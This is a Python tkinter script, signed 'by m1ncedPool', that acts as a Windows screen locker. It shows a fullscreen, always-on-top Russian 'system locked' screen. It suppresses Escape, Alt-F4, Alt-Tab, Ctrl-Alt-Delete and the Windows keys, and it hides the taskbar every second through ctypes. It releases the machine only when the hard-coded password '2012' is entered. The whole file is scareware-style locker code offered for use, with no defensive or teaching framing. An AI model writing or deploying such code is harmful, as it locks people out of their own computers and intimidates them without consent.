import tkinter as tk
from tkinter import messagebox
import sys
import ctypes

class SystemLocker:
    def __init__(self):
        self.password = "2012"
        self.root = tk.Tk()
        self.setup_window()
        self.create_widgets()
        self.block_taskbar_only()
        
    def setup_window(self):
        self.root.title("🔒 Система заблокирована")
        self.root.configure(bg='black')
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind('<Escape>', self.do_nothing)
        self.root.bind('<Alt-F4>', self.do_nothing)
        self.root.bind('<Control-c>', self.do_nothing)
        self.root.bind('<Control-q>', self.do_nothing)
        self.root.bind('<Control-Alt-Delete>', self.do_nothing)
        self.root.bind('<Super_L>', self.block_start)
        self.root.bind('<Super_R>', self.block_start)
        self.root.bind('<Alt-Tab>', self.do_nothing)
        self.root.bind('<Alt-Shift-Tab>', self.do_nothing)
    
    def do_nothing(self, event=None):
        return "break"
    
    def block_start(self, event=None):
        return "break"
    
    def block_taskbar_only(self):
        try:
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 0)
        except:
            pass
        
        self.root.after(1000, self.block_taskbar_only)
    
    def create_widgets(self):
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True)
        
        title = tk.Label(
            main_frame, 
            text="🔒 СИСТЕМА ЗАБЛОКИРОВАНА", 
            font=('Arial', 24, 'bold'),
            fg='red',
            bg='black'
        )
        title.pack(pady=20)
        
        tk.Label(
            main_frame,
            text="Введите пароль для разблокировки:",
            font=('Arial', 14),
            fg='white',
            bg='black'
        ).pack(pady=10)
        
        self.entry = tk.Entry(
            main_frame,
            show='*',
            font=('Arial', 16),
            width=20,
            justify='center'
        )
        self.entry.pack(pady=10)
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        
        btn = tk.Button(
            main_frame,
            text="Разблокировать",
            font=('Arial', 12),
            command=self.check_password,
            bg='red',
            fg='white',
            width=15,
            height=2
        )
        btn.pack(pady=10)
        
        hint = tk.Label(
            main_frame,
            text="Подсказка: год (4 цифры)",
            font=('Arial', 10),
            fg='gray',
            bg='black'
        )
        hint.pack(pady=5)
        
        signature = tk.Label(
            main_frame,
            text="by m1ncedPool",
            font=('Arial', 8, 'italic'),
            fg='#666666',
            bg='black'
        )
        signature.pack(side='bottom', pady=10)
    
    def check_password(self, event=None):
        entered_password = self.entry.get()
        
        if entered_password == self.password:
            self.unlock_system()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def unlock_system(self):
        try:
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 1)
        except:
            pass
        
        self.root.quit()
        self.root.destroy()
        sys.exit()
    
    def run(self):
        try:
            self.root.mainloop()
        except:
            self.unlock_system()

if __name__ == "__main__":
    locker = SystemLocker()
    locker.run()
